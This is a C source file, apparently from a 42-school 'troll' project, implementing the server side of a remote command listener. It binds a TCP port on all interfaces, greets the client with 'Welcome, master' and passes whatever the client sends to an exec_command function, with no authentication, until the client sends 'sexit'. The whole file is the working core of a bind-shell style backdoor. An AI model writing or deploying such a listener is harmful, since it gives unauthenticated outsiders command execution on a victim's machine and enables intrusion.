/* ******************************--------************************************ */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_cli.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: someone <someone@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/mm/dd hh:mm:ss by someone           #+#    #+#             */
/*   Updated: 2018/mm/dd hh:mm:ss by someone          ###   ########.troll    */
/*                                                                            */
/* ******************************--------************************************ */

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include "server.h"
#include "libft.h"

static int		g_sockfd;

static void		sigint_hdl(int sigc)
{
	if (sigc != SIGINT)
		return ;
	ft_putendl("\nByeBye!");
	close(g_sockfd);
	exit(0);
}

static int		get_admin_message(int sockfd, int newsockfd)
{
	struct pollfd		pfd;
	char				msg[256];

	pfd.fd = sockfd;
	pfd.events = POLLIN | POLLHUP | POLLRDNORM;
	pfd.revents = 0;
	ft_putendl("Welcome, master");
	while (pfd.revents == 0)
	{
		if (poll(&pfd, 1, 100) > 0 && check_recv(sockfd))
			break ;
		ft_bzero(msg, sizeof(msg));
		if (read(newsockfd, msg, sizeof(msg) - 1))
		{
			if (ft_strcmp(msg, "sexit") == 0)
			{
				close(newsockfd);
				return (FALSE);
			}
			exec_command(msg, newsockfd);
		}
	}
	close(newsockfd);
	return (TRUE);
}

static void		setup_sockaddr(t_sockaddr_in *dest)
{
	ft_bzero(dest, sizeof(t_sockaddr_in));
	dest->sin_family = AF_INET;
	dest->sin_addr.s_addr = INADDR_ANY;
	dest->sin_port = htons(TROLL_PORT);
}

int				main(int ac, char **av)
{
	int					nsockfd;
	t_sockaddr_in		serv_addr;
	t_sockaddr_in		client_addr;
	socklen_t			len;

	if (ac > 1)
		chdir(av[1]);
	if ((g_sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return (ft_returnmsg("Socket failure", STDERR_FILENO, EXIT_FAILURE));
	setup_sockaddr(&serv_addr);
	if (bind(g_sockfd, (t_sockaddr*)&serv_addr, sizeof(t_sockaddr_in)) == -1)
		return (ft_returnmsg("Bind error", STDERR_FILENO, EXIT_FAILURE));
	(void)signal(SIGINT, &sigint_hdl);
	(void)signal(SIGCHLD, &process_hdl);
	ft_putendl("Waiting for someone to take access");
	while (TRUE)
	{
		listen(g_sockfd, 1);
		len = sizeof(t_sockaddr_in);
		if ((nsockfd = accept(g_sockfd, (t_sockaddr*)&client_addr, &len)) == -1
			|| !get_admin_message(g_sockfd, nsockfd))
			break ;
	}
	close(g_sockfd);
	return (EXIT_SUCCESS);
}
